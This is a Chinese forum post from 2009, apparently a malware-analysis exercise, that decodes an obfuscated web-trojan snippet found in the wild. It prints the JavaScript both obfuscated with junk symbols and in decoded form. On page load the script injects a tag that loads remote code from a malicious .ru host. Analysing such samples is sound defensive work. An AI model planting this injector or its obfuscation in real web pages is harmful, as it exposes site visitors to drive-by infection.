# [LCG作业]一个网马解密实例

> **作者**: frozenrain | **发布时间**: 2009-12-29 08:44:00 | **版块**: 『病毒样本区』 | **查看/回复**: 5652 / 15
> **原文**: [https://www.52pojie.cn/thread-36347-1-1.html](https://www.52pojie.cn/thread-36347-1-1.html)

---

*本帖最后由 frozenrain 于 2010-2-9 21:36 编辑*

前几天在网马里找到的一个样本：

> <script>/\*GNU GPL\*/ try{window.onload = function(){var Pfj8ymfhkn5 = document.createElement('s#!c!$$r&$&&i#^!p@#t#'.replace(/\$|\!|#|&|@|\(|\^|\)/ig, ''));Pfj8ymfhkn5.setAttribute('type', 'text/javascript');Pfj8ymfhkn5.setAttribute('src',  'h&$&^t@t#!()p$$$:@@/@$/()^f^&()o@)$&x@s&$!p@!o#!r&t!$)^s)(&-#&(^c(!o)&m#&(.&n&@a$($(r!o!)!d#).#@r^$u$$.$(@&$d!m&)&!m^)-^)c@(&((o$#(-!j$#$p$#!.)^^s&u$(#&g#$&&#a$)&r&$^#y)^h#@(o)^&m!!$e$@.@&r#@))u(!!$:(8@0)&8!(0$@(/)##p&^&c$!p^!o^&()#p^(.(c)!o@(m#$/&(p#c^&p)&o$p)#.!c&^&&o#(&m($/#g&^$o(^o!$#(!g^l$(&e$.(^&c$()(o#!@^m@&&/@##e#l^!m$u^($)#n^$^$(d(!o!)^!#.(#e!#(@s&&#/@(g^o@#o!g@@)l&#@@e)^#.$)a)(@t#/)'.replace(/&|\(|\^|\$|\)|@|#|\!/ig, ''));Pfj8ymfhkn5.setAttribute('defer', 'defer');Pfj8ymfhkn5.setAttribute('id', 'Y^x)x@m&!(n$)b&(u)6##^&g##!^h^)@'.replace(/\!|@|\$|\^|\)|&|#|\(/ig, ''));document.body.appendChild(Pfj8ymfhkn5);}} catch(e) {}</script>

刚开始拿起来不知道如何着手，太乱了。神器等工具肯定是没办法啦，当然如果你有点js脚本基础就OK了。
.replace(/\$|\!|#|&|@|\(|\^|\)/ig, ''))，这句就是关键，正则表达式匹配@#￥！（）等符号，去掉就OK了，
以下为解密结果：

> <script>/\*GNU GPL\*/ try{window.onload = function{var Pfj8ymfhkn5 = document.createElement('script');Pfj8ymfhkn5.setAttribute('type', 'text/javascript');Pfj8ymfhkn5.setAttribute('src',  'http://foxsports-com.narod.ru.dmm-co-jp.sugaryhome.ru:8080/pcpop.com/pcpop.com/google.com/elmundo.es/google.at/');Pfj8ymfhkn5.setAttribute('defer', 'defer');Pfj8ymfhkn5.setAttribute('id', 'Yxxmnbu6gh');document.body.appendChild(Pfj8ymfhkn5);}} catch(e) {}</script>

所以解密网马不要太依赖工具，懂点脚本语言就好多了。:lol
